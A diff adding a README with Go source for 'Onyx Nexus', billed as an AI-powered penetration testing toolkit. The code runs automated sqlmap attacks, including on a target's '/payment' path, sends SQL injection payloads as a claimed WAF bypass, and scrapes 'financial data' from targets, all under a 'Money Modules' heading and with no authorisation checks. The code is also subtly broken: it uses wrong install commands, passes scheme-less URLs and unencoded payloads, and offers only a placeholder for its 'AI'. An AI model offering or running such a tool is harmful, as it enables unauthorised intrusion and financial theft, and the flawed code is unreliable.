@@ -1,0 +1,340 @@
+Onyx Nexus: AI-Powered Penetration Testing Toolkit
+Overview
+Onyx Nexus is a comprehensive, AI-powered penetration testing toolkit designed to automate reconnaissance, vulnerability assessment, and exploitation tasks. It integrates popular security tools like Sublist3r, nmap, sqlmap, and gau to provide a seamless workflow for security professionals. The toolkit also includes modules for financial data scraping, payment gateway testing, and report generation.
+
+Features
+Automated Reconnaissance:
+
+Subdomain enumeration using Sublist3r.
+
+Comprehensive port scanning and service detection using nmap.
+
+Smart Exploitation:
+
+SQL injection testing using sqlmap.
+
+Web Application Firewall (WAF) bypass techniques.
+
+Money Modules:
+
+API endpoint discovery using gau.
+
+Cryptocurrency address validation.
+
+Payment gateway testing for vulnerabilities.
+
+Financial data scraping.
+
+Report Generation:
+
+Generates a detailed PDF report with findings.
+
+AI Integration:
+
+Placeholder for AI model training and prediction (to be extended).
+
+Installation
+Prerequisites:
+
+Go (Golang) installed.
+
+Python 3.x and pip installed.
+
+Basic Linux utilities (git, wget, etc.).
+
+Clone the Repository:
+
+bash
+Copy
+git clone https://github.com/yourusername/onyx-nexus.git
+cd onyx-nexus
+Install Dependencies:
+Run the following command to install all required dependencies:
+
+bash
+Copy
+go run main.go --install
+Usage
+Run the toolkit with the following command:
+
+bash
+Copy
+go run main.go --target example.com
+Command-Line Options:
+--target: Specify the target domain (e.g., example.com).
+
+--install: Install dependencies (run once before using the toolkit).
+
+--report: Generate a PDF report after the scan.
+
+Code Implementation
+1. Main File (main.go)
+go
+Copy
+package main
+
+import (
+	"flag"
+	"fmt"
+	"log"
+	"os"
+	"path/filepath"
+)
+
+// Configuration
+var (
+	TOOLKIT_DIR string
+	LOG_FILE    = "nexus.log"
+)
+
+func init() {
+	// Resolve the toolkit directory path.
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		log.Fatal(err)
+	}
+	TOOLKIT_DIR = filepath.Join(homeDir, "onyx_nexus")
+}
+
+func main() {
+	target := flag.String("target", "", "Target domain (e.g., example.com)")
+	install := flag.Bool("install", false, "Install dependencies")
+	report := flag.Bool("report", false, "Generate a PDF report")
+	flag.Parse()
+
+	if *install {
+		installDependencies()
+		return
+	}
+
+	if *target == "" {
+		fmt.Println("Error: Target domain is required.")
+		flag.Usage()
+		return
+	}
+
+	initializeToolkit()
+	aiRecon(*target)
+	smartExploit(*target)
+	moneyModules(*target)
+
+	if *report {
+		generateReport(*target)
+	}
+}
+2. Dependency Installation (install.go)
+go
+Copy
+package main
+
+import (
+	"fmt"
+	"log"
+	"os/exec"
+	"strings"
+)
+
+func installDependencies() {
+	fmt.Println("[+] Installing dependencies...")
+	commands := [][]string{
+		{"sudo", "apt-get", "update"},
+		{"sudo", "apt-get", "install", "-y", "git", "python3", "python3-pip"},
+		{"git", "clone", "https://github.com/aboul3la/Sublist3r.git"},
+		{"sudo", "ln", "-s", "./Sublist3r/sublist3r.py", "/usr/local/bin/sublist3r"},
+		{"pip3", "install", "gau", "sqlmap", "nmap"},
+	}
+	for _, args := range commands {
+		cmd := exec.Command(args[0], args[1:]...)
+		if output, err := cmd.CombinedOutput(); err != nil {
+			log.Fatalf("Command failed: %s\nOutput: %s", strings.Join(args, " "), output)
+		}
+	}
+	fmt.Println("[+] Dependencies installed successfully.")
+}
+3. Reconnaissance (recon.go)
+go
+Copy
+package main
+
+import (
+	"fmt"
+	"log"
+	"os/exec"
+	"strings"
+)
+
+func aiRecon(target string) {
+	fmt.Printf("[+] Running AI reconnaissance on %s...\n", target)
+	commands := [][]string{
+		{"sublist3r", "-d", target, "-o", "subdomains.txt"},
+		{"nmap", "-sV", "-sC", "-oN", "nmap_scan.txt", target},
+	}
+	for _, args := range commands {
+		cmd := exec.Command(args[0], args[1:]...)
+		if output, err := cmd.CombinedOutput(); err != nil {
+			log.Fatalf("Command failed: %s\nOutput: %s", strings.Join(args, " "), output)
+		}
+	}
+	fmt.Println("[+] Reconnaissance completed.")
+}
+4. Exploitation (exploit.go)
+go
+Copy
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+	"os/exec"
+)
+
+func smartExploit(target string) {
+	fmt.Printf("[+] Running smart exploitation on %s...\n", target)
+	cmd := exec.Command("sqlmap", "-u", target, "--batch", "--output-dir", "sqlmap")
+	if output, err := cmd.CombinedOutput(); err != nil {
+		log.Fatalf("Command failed: sqlmap\nOutput: %s", output)
+	}
+	bypassWAF(target)
+}
+
+func bypassWAF(target string) {
+	payloads := []string{"' OR 1=1 --", "' UNION SELECT null, null --"}
+	for _, payload := range payloads {
+		resp, err := http.Get(fmt.Sprintf("%s?id=%s", target, payload))
+		if err != nil {
+			log.Fatal(err)
+		}
+		if resp.StatusCode == http.StatusOK {
+			fmt.Printf("[+] WAF bypassed with payload: %s\n", payload)
+		}
+	}
+}
+5. Money Modules (money.go)
+go
+Copy
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+	"os/exec"
+	"regexp"
+
+	"github.com/PuerkitoBio/goquery"
+)
+
+func moneyModules(target string) {
+	fmt.Println("[+] Running money modules...")
+
+	// Subdomain Enumeration
+	cmd := exec.Command("sublist3r", "-d", target, "-o", "subdomains.txt")
+	if output, err := cmd.CombinedOutput(); err != nil {
+		log.Fatalf("Command failed: sublist3r\nOutput: %s", output)
+	}
+	fmt.Println("[+] Subdomains saved to subdomains.txt")
+
+	// API Endpoint Discovery
+	cmd = exec.Command("gau", target, "--o", "api_endpoints.txt")
+	if output, err := cmd.CombinedOutput(); err != nil {
+		log.Fatalf("Command failed: gau\nOutput: %s", output)
+	}
+	fmt.Println("[+] API endpoints saved to api_endpoints.txt")
+
+	// Cryptocurrency Address Validation
+	cryptoAddress := "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" // Example Bitcoin address.
+	if isValidCryptoAddress(cryptoAddress) {
+		fmt.Printf("[+] Valid cryptocurrency address: %s\n", cryptoAddress)
+	} else {
+		fmt.Printf("[-] Invalid cryptocurrency address: %s\n", cryptoAddress)
+	}
+
+	// Payment Gateway Testing
+	paymentGatewayURL := "https://" + target + "/payment"
+	testPaymentGateway(paymentGatewayURL)
+
+	// Financial Data Scraping
+	financialData := scrapeFinancialData("https://" + target)
+	fmt.Printf("[+] Scraped financial data: %v\n", financialData)
+}
+
+func isValidCryptoAddress(address string) bool {
+	bitcoinRegex := `^(1|3)[A-Za-z0-9]{25,34}$`
+	match, _ := regexp.MatchString(bitcoinRegex, address)
+	return match
+}
+
+func testPaymentGateway(url string) {
+	fmt.Printf("[+] Testing payment gateway at %s...\n", url)
+	cmd := exec.Command("sqlmap", "-u", url, "--batch", "--output-dir", "sqlmap_payment")
+	if output, err := cmd.CombinedOutput(); err != nil {
+		log.Fatalf("Command failed: sqlmap\nOutput: %s", output)
+	}
+	fmt.Println("[+] Payment gateway tested for SQL injection.")
+}
+
+func scrapeFinancialData(url string) map[string]string {
+	fmt.Printf("[+] Scraping financial data from %s...\n", url)
+	resp, err := http.Get(url)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer resp.Body.Close()
+
+	doc, err := goquery.NewDocumentFromReader(resp.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	financialData := make(map[string]string)
+	doc.Find("div.financial-data").Each(func(i int, s *goquery.Selection) {
+		key := s.Find("span.key").Text()
+		value := s.Find("span.value").Text()
+		financialData[key] = value
+	})
+
+	return financialData
+}
+6. Report Generation (report.go)
+go
+Copy
+package main
+
+import (
+	"fmt"
+	"os"
+
+	"github.com/jung-kurt/gofpdf"
+)
+
+func generateReport(target string) {
+	fmt.Println("[+] Generating report...")
+	pdf := gofpdf.New("P", "mm", "A4", "")
+	pdf.AddPage()
+	pdf.SetFont("Arial", "B", 16)
+	pdf.Cell(40, 10, "Onyx Nexus Report")
+	pdf.Ln(20)
+	pdf.SetFont("Arial", "", 12)
+	pdf.Cell(40, 10, fmt.Sprintf("Target: %s", target))
+	pdf.Ln(10)
+	pdf.Cell(40, 10, "Subdomains:")
+	pdf.Ln(10)
+	subdomains, _ := os.ReadFile("subdomains.txt")
+	pdf.MultiCell(0, 10, string(subdomains), "", "", false)
+	pdf.Ln(10)
+	pdf.Cell(40, 10, "Nmap Scan Results:")
+	pdf.Ln(10)
+	nmapResults, _ := os.ReadFile("nmap_scan.txt")
+	pdf.MultiCell(0, 10, string(nmapResults), "", "", false)
+	pdf.Ln(10)
+	pdf.Cell(40, 10, "Financial Data:")
+	pdf.Ln(10)
+	financialData := scrapeFinancialData("https://" + target)
+	for key, value := range financialData {
+		pdf.Cell(40, 10, fmt.Sprintf("%s: %s", key, value))
+		pdf.Ln(10)
+	}
+	pdf.OutputFileAndClose("report.pdf")
+	fmt.Println("[+] Report saved to report.pdf")
+}
